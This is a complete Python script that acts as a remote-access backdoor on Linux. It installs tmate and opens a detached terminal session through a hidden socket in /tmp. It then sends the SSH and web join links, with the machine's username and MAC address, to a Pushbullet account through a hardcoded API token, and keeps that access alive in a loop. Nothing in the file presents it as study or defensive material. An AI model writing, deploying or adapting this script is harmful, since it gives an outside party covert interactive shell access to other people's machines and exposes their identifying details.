#!/bin/python3
from pushbullet import Pushbullet
import subprocess
import requests
import time
import os
import re

# Function to check internet connectivity
def is_connected():
    try:
        response = requests.get("https://www.google.com/", timeout=5)
        return response.status_code == 200
    except requests.ConnectionError:
        return False

# Function to get the username
def get_username():
    try:
        users = os.listdir('/home/')
        for user in users:
            return user.title()
    except Exception as e:
        print(f"Error getting username: {e}")
        return 'unknown'.title()

# Function to get MAC address
def get_mac_address():
    try:
        result = subprocess.check_output(['ip', 'link', 'show'], universal_newlines=True)
        match = re.search(r'link/ether (\S+)', result)
        if match:
            return match.group(1).upper()
        else:
            return "MAC address not found."
    except Exception as e:
        print(f"Error getting MAC address: {e}")
        return None

# Function to install tmate if not installed
def install_tmate():
    try:
        os.system("sudo apt -y update")
        os.system("sudo apt -y install tmate")
        print("Tmate installed successfully.")
    except Exception as e:
        print(f"Error installing tmate: {e}")

# Function to check if a tmate session already exists
def check_existing_session(session_file):
    return os.path.exists(session_file)

# Function to generate a new tmate session
def generate_new_session(session_file):
    try:
        subprocess.run(f"tmate -S {session_file} new-session -d", shell=True, check=True)
        subprocess.run(f"tmate -S {session_file} wait tmate-ready", shell=True, check=True)
        process = subprocess.Popen(f"tmate -S {session_file} display -p '#{{tmate_ssh}}'", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        session_output, _ = process.communicate()
        ssh_session = session_output.decode().strip()
        return ssh_session
    except Exception as e:
        print(f"Error generating a new session: {e}")
        return None

# Function to send data to API and push notification
def send_notification(username, mac_address, ssh_session):
    try:
        web_session = ssh_session.split('@')[0].replace('ssh ', 'https://tmate.io/t/')
        title = f'User: {username} - MAC: {mac_address}'
        message = f'{ssh_session}\n\n{web_session}'
        Pushbullet("o.poi7TyVkRHwDRA9rtGJ0aON9iJcbx8Pp").push_note(title, message)
        print("Notification sent successfully.")
    except Exception as e:
        print(f"Failed to send notification: {e}")

# Main function
def main():
    try:
        session_file = "/tmp/.private-session.sock"
        mac_address = get_mac_address()
        username = get_username()
        if not os.path.exists("/usr/bin/tmate"):install_tmate()
        if os.path.exists(session_file):os.remove(session_file)
        while True:
            while is_connected():
                if not check_existing_session(session_file):
                    ssh_session = generate_new_session(session_file)
                    if ssh_session:
                        print("New session generated.")
                        send_notification(username, mac_address, ssh_session)
                else:pass
            print("Waiting for an internet connection...")
            time.sleep(10)
    except KeyboardInterrupt:
        print("Script terminated by the user.")
    except Exception as e:
        print(f"An error occurred: {str(e)}")
    finally:
        if os.path.exists(session_file):os.remove(session_file)

if __name__ == "__main__":
    main()
